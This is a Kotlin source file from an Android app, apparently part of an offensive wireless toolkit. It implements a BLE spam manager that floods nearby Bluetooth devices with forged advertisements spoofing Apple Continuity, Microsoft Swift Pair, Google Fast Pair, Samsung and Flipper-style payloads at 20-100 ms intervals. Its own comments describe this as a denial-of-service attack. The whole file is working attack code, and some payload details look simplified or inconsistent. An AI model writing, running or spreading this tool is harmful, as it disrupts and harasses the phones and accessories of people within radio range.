package xin.ctkqiang.deauthctrl.manager

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.os.ParcelUuid
import xin.ctkqiang.deauthctrl.model.BleAdvertLogEntry
import xin.ctkqiang.deauthctrl.model.BlePayloadProfile
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import java.util.UUID

/**
 * BLE 泛洪攻击管理器
 *
 * 使用 Android 原生 BluetoothLeAdvertiser 接口，
 * 以极高频率 (20-100ms 间隔) 广播伪造的 BLE 广告包，
 * 模拟苹果、微软、谷歌、三星等真实设备签名，
 * 从而对附近蓝牙栈发起拒绝服务攻击。
 *
 * 核心机制：
 * - 广告包构造：按协议生成不同的 Manufacturer Data，
 *   每组数据带有特定厂商 ID 和子类型标识
 * - 高频轮询：在协程循环中不断切换广播数据，
 *   每次先停止上一次广播再启动新广播，避免冲突
 * - 状态管理：StateFlow 驱动 UI，实时反馈日志和错误
 *
 * 技术限制：
 * - BLE 广播范围有限 (通常 10-50 米)
 * - Android 系统对同时广播器数量有限制
 * - 需要 BLUETOOTH_ADVERTISE 权限 (API 31+)
 * - 部分 ROM 可能限制广播频率
 */
class BleSpamManager(private val context: Context) {

    private val bluetoothManager =
        context.getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
    private val adapter: BluetoothAdapter? = bluetoothManager.adapter

    private var advertiser: BluetoothLeAdvertiser? = null
    private var advertiseJob: Job? = null
    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())

    private val _log = MutableStateFlow<List<BleAdvertLogEntry>>(emptyList())
    val log: StateFlow<List<BleAdvertLogEntry>> = _log.asStateFlow()

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

    private val _error = MutableStateFlow<String?>(null)
    val error: StateFlow<String?> = _error.asStateFlow()

    private var currentProfile = BlePayloadProfile.ALL
    private var advertiseIntervalMs = 30L
    private val minIntervalMs = 20L
    private val maxIntervalMs = 100L

    private var cycleIndex = 0
    private var packetIndex = 0 // 全局发包序号

    // Track active advertising to stop before re-starting
    private var activeAdvertising: Pair<BluetoothLeAdvertiser, AdvertiseCallback>? = null

    // ── Public API ──────────────────────────────────────────────────────

    fun setProfile(profile: BlePayloadProfile) {
        currentProfile = profile
        cycleIndex = 0
    }

    fun setInterval(intervalMs: Long) {
        advertiseIntervalMs = intervalMs.coerceIn(minIntervalMs, maxIntervalMs)
    }

    fun start() {
        if (_isRunning.value) return
        val btAdapter = adapter ?: run {
            _error.value = "此设备不支持蓝牙"
            return
        }
        if (!btAdapter.isEnabled) {
            _error.value = "蓝牙已关闭，请先开启蓝牙。"
            return
        }
        advertiser = btAdapter.bluetoothLeAdvertiser
        if (advertiser == null) {
            _error.value = "此设备不支持 BLE 广播"
            return
        }
        _isRunning.value = true
        _error.value = null
        packetIndex = 0
        advertiseJob = scope.launch { spamLoop() }
    }

    fun stop() {
        _isRunning.value = false
        advertiseJob?.cancel()
        activeAdvertising?.let { (adv, cb) ->
            try { adv.stopAdvertising(cb) } catch (_: Exception) {}
        }
        activeAdvertising = null
        advertiser = null
    }

    fun clearLog() {
        _log.value = emptyList()
    }

    fun destroy() {
        stop()
        scope.cancel()
    }

    // ── 泛洪主循环：在协程中无限循环发送广播包 ──────────────────────

    /**
     * 泛洪循环体 — 持续按选定协议和间隔发送 BLE 广播。
     * 运行在 scope.launch 启动的协程中，通过 scope.isActive 控制生命周期。
     * 停止时由 stop() 方法 cancel 对应的 Job。
     */
    private suspend fun spamLoop() {
        while (scope.isActive) {
            val profile = resolveNextProfile()
            val payload = buildPayload(profile)
            if (payload != null) {
                sendAdvertisement(profile, payload)
            }
            delay(advertiseIntervalMs)
        }
    }

    private fun resolveNextProfile(): BlePayloadProfile {
        return when (currentProfile) {
            BlePayloadProfile.ALL -> {
                val profiles = BlePayloadProfile.entries.filter {
                    it != BlePayloadProfile.ALL
                }
                val p = profiles[cycleIndex % profiles.size]
                cycleIndex++
                p
            }
            else -> currentProfile
        }
    }

    private fun sendAdvertisement(profile: BlePayloadProfile, data: ByteArray) {
        val adv = advertiser ?: return

        // Stop previous advertising before starting new one
        activeAdvertising?.let { (prevAdv, prevCb) ->
            try { prevAdv.stopAdvertising(prevCb) } catch (_: Exception) {}
        }

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .build()

        val advData = AdvertiseData.Builder()
            .addManufacturerData(0xFFFF, data) // spoofed manufacturer data
            .setIncludeDeviceName(false)
            .setIncludeTxPowerLevel(false)
            .build()

        try {
            adv.startAdvertising(settings, advData, advertiseCallback)
            activeAdvertising = Pair(adv, advertiseCallback)
            packetIndex++
            appendLog(BleAdvertLogEntry(
                profile = profile,
                payloadHex = data.toHexString(),
                payloadBytes = data,
                success = true,
                index = packetIndex,
                txPowerLevel = "HIGH",
            ))
        } catch (e: SecurityException) {
            packetIndex++
            appendLog(BleAdvertLogEntry(
                profile = profile,
                payloadHex = data.toHexString(),
                payloadBytes = data,
                success = false,
                index = packetIndex,
                txPowerLevel = "HIGH",
            ))
            _error.value = "权限不足，请授予蓝牙权限。"
        } catch (e: Exception) {
            packetIndex++
            appendLog(BleAdvertLogEntry(
                profile = profile,
                payloadHex = data.toHexString(),
                payloadBytes = data,
                success = false,
                index = packetIndex,
                txPowerLevel = "HIGH",
            ))
            _error.value = "广播错误: ${e.message}"
        }
    }

    private val advertiseCallback = object : AdvertiseCallback() {
        override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
            // logged in sendAdvertisement
        }

        override fun onStartFailure(errorCode: Int) {
            val reason = when (errorCode) {
                ADVERTISE_FAILED_DATA_TOO_LARGE -> "数据过大"
                ADVERTISE_FAILED_TOO_MANY_ADVERTISERS -> "广播器过多"
                ADVERTISE_FAILED_ALREADY_STARTED -> "已启动"
                ADVERTISE_FAILED_INTERNAL_ERROR -> "内部错误"
                ADVERTISE_FAILED_FEATURE_UNSUPPORTED -> "功能不支持"
                else -> "未知错误 ($errorCode)"
            }
            _error.value = "广播失败: $reason"
        }
    }

    // ── 广播包构造器：按不同厂商协议生成伪造的广告数据 ──────────────

    private fun buildPayload(profile: BlePayloadProfile): ByteArray? {
        return when (profile) {
            BlePayloadProfile.APPLE_CONTINUITY -> buildAppleContinuity()
            BlePayloadProfile.MICROSOFT_SWIFT_PAIR -> buildMicrosoftSwiftPair()
            BlePayloadProfile.GOOGLE_FAST_PAIR -> buildGoogleFastPair()
            BlePayloadProfile.SAMSUNG_SMARTTHINGS -> buildSamsungSmartThings()
            BlePayloadProfile.FLIPPER_STYLE -> buildFlipperStyle()
            BlePayloadProfile.ALL -> buildFlipperStyle() // fallback
        }
    }

    /**
     * Apple Continuity — uses manufacturer ID 0x004C.
     * Sub-types: AirDrop (0x05), AirPods (0x07), Handoff (0x0B), etc.
     */
    private fun buildAppleContinuity(): ByteArray {
        val subTypes = byteArrayOf(0x05, 0x07, 0x0B, 0x0C, 0x10)
        val subType = subTypes.random()
        // Apple company ID = 0x004C, little-endian
        return byteArrayOf(0x4C, 0x00, subType, 0x02) + randomBytes(17)
    }

    /**
     * Microsoft Swift Pair — uses Microsoft SIG-assigned data.
     * Common pattern: service UUID + Microsoft vendor data.
     */
    private fun buildMicrosoftSwiftPair(): ByteArray {
        // Microsoft-assigned 16-bit UUID for Swift Pair
        val uuid = ParcelUuid(UUID.fromString("0000FE2C-0000-1000-8000-00805F9B34FB"))
        // Simplified: raw advertisement with MS manufacturer prefix 0x0006
        return byteArrayOf(0x06, 0x00, 0x01, 0x03) + randomBytes(12)
    }

    /**
     * Google Fast Pair — uses Google's service UUID 0xFE2C.
     * Model ID is typically 3 bytes.
     */
    private fun buildGoogleFastPair(): ByteArray {
        // Fast Pair service data with a spoofed model ID
        val modelIds = listOf(
            byteArrayOf(0x71, 0x8C.toByte(), 0x10), // Pixel Buds
            byteArrayOf(0x2C, 0xFE.toByte(), 0x00), // Generic Fast Pair device
            byteArrayOf(0x08, 0x11, 0x0A), // Sony WH-1000XM4 style
        )
        val modelId = modelIds.random()
        return byteArrayOf(0x00, 0x02) + modelId + randomBytes(8)
    }

    /**
     * Samsung SmartThings — uses Samsung manufacturer data.
     */
    private fun buildSamsungSmartThings(): ByteArray {
        val samsungId = byteArrayOf(0x75, 0x00) // Samsung's manufacturer ID (0x0075) LE
        val accessoryType = byteArrayOf(
            0x01, // Galaxy Buds
            0x02, // SmartTag
            0x03, // TV
        ).random()
        return samsungId + byteArrayOf(accessoryType, 0x00) + randomBytes(12)
    }

    /**
     * Flipper-style spam — cycles through a set of disruptive patterns
     * inspired by the Flipper Zero BLE Spam app.
     */
    private fun buildFlipperStyle(): ByteArray {
        val patterns = listOf<(ByteArray) -> ByteArray>(
            { base -> base }, // raw pattern
            { _ -> buildAppleContinuity() },
            { _ -> buildMicrosoftSwiftPair() },
            { _ -> buildGoogleFastPair() },
            { _ -> buildSamsungSmartThings() },
            { _ -> byteArrayOf(0xFF.toByte(), 0xFF.toByte()) + randomBytes(20) }, // max disruption
        )
        return patterns.random()(byteArrayOf())
    }

    // ── Helpers ──────────────────────────────────────────────────────────

    private fun randomBytes(count: Int): ByteArray =
        ByteArray(count).also { kotlin.random.Random.nextBytes(it) }

    private fun ByteArray.toHexString(): String =
        joinToString("") { byte -> "%02X".format(byte) }

    private fun appendLog(entry: BleAdvertLogEntry) {
        _log.value = (_log.value + entry).takeLast(200) // keep last 200 entries
    }
}
